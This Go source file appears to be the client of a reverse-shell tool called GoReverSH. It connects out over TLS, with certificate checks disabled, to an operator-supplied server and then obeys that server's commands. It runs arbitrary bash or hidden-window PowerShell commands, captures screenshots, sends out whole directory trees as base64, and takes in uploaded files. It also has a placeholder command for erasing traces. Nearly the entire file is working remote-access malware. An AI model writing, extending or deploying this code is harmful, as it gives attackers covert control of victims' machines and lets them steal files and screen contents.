package main

import (
	"GoReverSH/utils"
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"image/png"
	"io"
	"io/fs"
	"log"
	"math/big"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/kbinani/screenshot"
)

type Option struct {
	LHOST string
	RHOST string
}

//4桁のIDを作成
func genNumStr(len int) string {
	var container string
	var str = "1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

func padString(source string, toLength int) string {
	currLength := len(source)
	remLength := toLength - currLength

	for i := 0; i < remLength; i++ {
		source += ":"
	}
	return source
}

//TODO outputDirを指定
//スクリーンショットを撮影
//conn net.Conn
func getscreenshot() ([]string, error) {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return nil, err
		}
		/*
			if runtime.GOOS == "windows" {
				fpth = `C:\Windows\Temp\`
			} else {
				fpth = `/tmp/`
			}
		*/
		fpth = "./screenshot/"
		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, err := os.Create(fullpath)
		if err != nil {
			return nil, err
		}

		defer file.Close()
		png.Encode(file, img)
		//png.Encode(conn, img)

		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return filenames, nil
}

func runShell(conn net.Conn) {
	defer conn.Close()
	for {
		cmdBuff := make([]byte, 1024)
		n, err := conn.Read(cmdBuff)
		if err != nil {
			if errors.Is(err, io.EOF) {
				log.Println("disconnect")
				return
			}
			log.Println(err)
			return
		}

		commands := strings.Split(string(cmdBuff[:n]), " ")

		//コマンドの引数の数もチェックすること
		switch commands[0] {
		case "cd":
			dir := commands[len(commands)-1]
			os.Chdir(string(dir))

		case "upload":
			filePath := strings.Split(commands[len(commands)-1], "/")
			lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
			dir := "upload/"
			if _, err := os.Stat(dir + lastPathFromRecievedFile); os.IsNotExist(err) {
				if err2 := os.MkdirAll(dir+lastPathFromRecievedFile, 0755); err2 != nil {
					log.Fatalf("Could not create the path %s", dir)
				}
			}
			fileName := commands[len(commands)-1]
			fmt.Println(fileName)
			//read
			//最終的な入れ物
			var content []byte
			//読み込むもの
			buf := make([]byte, 1024)
			//読み込む位置
			size := 0
			//fmt.Printf("%p\n", content)

			for {
				//ファイルを読み込む
				n, err := conn.Read(buf)
				if err != nil {
					if n == 0 || err == io.EOF {
						break
					}
					log.Println(err)
					break
				}
				//content + bufの中身を一時的に保存。
				tmp := make([]byte, 0, size+n)
				tmp = append(content[:size], buf[:n]...)
				content = tmp
				size += n
				if n < 1024 {
					break
				}
			}

			//fmt.Println(string(content))
			//save
			file, err := os.Create(dir + fileName)
			if err != nil {
				log.Println(err)
				break
			}
			base64ToData, err := base64.StdEncoding.DecodeString(string(content))
			_, err = file.Write(base64ToData)
			if err != nil {
				file.Close()
				log.Println(err)
				break
			}
			err = file.Close()
			if err != nil {
				log.Println(err)
				break
			}
			fmt.Println("content save")

		case "screenshot": //ex: screenshot
			//スクリーンショットを撮影し送信
			filenames, err := getscreenshot()
			//fmt.Println(filenames)
			if err != nil {
				continue
			}

			for _, fname := range filenames {
				//sendfile args fname
				f, err := os.Open(fname)
				if err != nil {
					break
				}

				fstats, err := f.Stat()
				if err != nil {
					break
				}

				filepath := strings.Split(fname, "/")
				fileLastname := filepath[len(filepath)-1]

				var content []byte
				buff := make([]byte, 1024)
				size := 0

				for {
					n, err := f.Read(buff)
					if err != nil {
						if n == 0 || errors.Is(err, io.EOF) {
							break
						}
						log.Println(err)
						break
					}
					//content + bufの中身を一時的に保存。
					tmp := make([]byte, 0, size+n)
					tmp = append(content[:size], buff[:n]...)
					content = tmp
					size += n
					if n < 1024 {
						break
					}
				}

				imageToBase64 := base64.StdEncoding.EncodeToString(content)
				fileinfo := utils.FileInfo{Name: "screenshot/" + fileLastname, Body: []byte(imageToBase64), Size: fstats.Size()}

				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

				err = json.NewEncoder(conn).Encode(output)
				if err != nil {
					break
				}

				f.Close()
			}

			fmt.Println("screenshot finished")

		case "download": //ex: download [path]
			//ファイルシステム構築
			rootPath := commands[len(commands)-1]
			fsys := os.DirFS(rootPath)
			err := fs.WalkDir(fsys, ".", func(path string, d fs.DirEntry, err error) error {
				if err != nil {
					log.Println(err)
					return errors.New("failed filepath.Walk: " + err.Error())
				}
				if d.IsDir() {
					log.Println(1)

					return nil
				}

				f, err := os.Open(rootPath + "/" + path)
				if err != nil {
					log.Println(err)

					return err
				}

				fstats, err := f.Stat()
				if err != nil {
					log.Println(err)

					return err
				}

				var content []byte
				buff := make([]byte, 1024)
				size := 0

				for {
					n, err := f.Read(buff)
					if err != nil {
						if n == 0 || errors.Is(err, io.EOF) {
							break
						}
						log.Println(err)
						break
					}
					//content + bufの中身を一時的に保存。
					tmp := make([]byte, 0, size+n)
					tmp = append(content[:size], buff[:n]...)
					content = tmp
					size += n
					if n < 1024 {
						break
					}
				}

				imageToBase64 := base64.StdEncoding.EncodeToString(content)
				fileinfo := utils.FileInfo{Name: "download/" + rootPath + "/" + path, Body: []byte(imageToBase64), Size: fstats.Size()}

				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

				err = json.NewEncoder(conn).Encode(output)
				if err != nil {
					return nil
				}

				//fmt.Println(output)

				f.Close()

				//create file write
				//files = append(files, path)
				//fmt.Println(path)
				return nil
			})
			if err != nil {
				log.Println(err)
			}

		case "clean": //痕跡消去 ex: clean_go_reversh
		//tips/main11.goを参考

		default:
			var cmd *exec.Cmd
			//mac linux or windows
			if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
				cmd = exec.Command("/bin/bash", "-c", string(cmdBuff[:n]))
			} else if runtime.GOOS == "windows" {
				cmd = exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo", string(cmdBuff[:n]))
			}
			out, err := cmd.Output()
			if err != nil {
				log.Println(err)
				//return
			}

			output := utils.Output{Type: utils.MESSAGE, Message: out}
			/*
				jsonOut, err := json.Marshal(output)
				if err != nil {
					log.Println(err)
					//return
				}
				_, err = conn.Write(jsonOut)
				if err != nil {
					log.Println(err)
					//return
				}
			*/
			err = json.NewEncoder(conn).Encode(output)
			if err != nil {
				log.Println(err)
			}

			/*
				//後で消す
				fmt.Println(string(out))
				_, err = conn.Write(out)
				if err != nil {
					log.Println(err)
					return
				}
			*/
		}
	}

}

func main() {
	certFile, keyFile, err := utils.GenClientCerts()
	if err != nil {
		log.Fatalln(err)
	}
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("Loadkeys : %s", err)
	}
	config := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	//config := &tls.Config{InsecureSkipVerify: true}

	server := flag.String("server", "", "ipaddr")
	port := flag.String("port", "8000", "port")
	flag.Parse()

	//fmt.Println(*server, *port)
	conn, err := tls.Dial("tcp", net.JoinHostPort(*server, *port), config)
	if err != nil {
		log.Fatalf("Client dial error: %s", err)
	}
	defer fmt.Println("Cleanup")
	defer conn.Close()

	//クライアント名を作成
	//hostName, _ := os.Hostname() //develop
	hostName := "" //debug
	id := genNumStr(4)
	clientName := hostName + id
	//送信
	conn.Write([]byte(clientName))

	//shell
	runShell(conn)
}
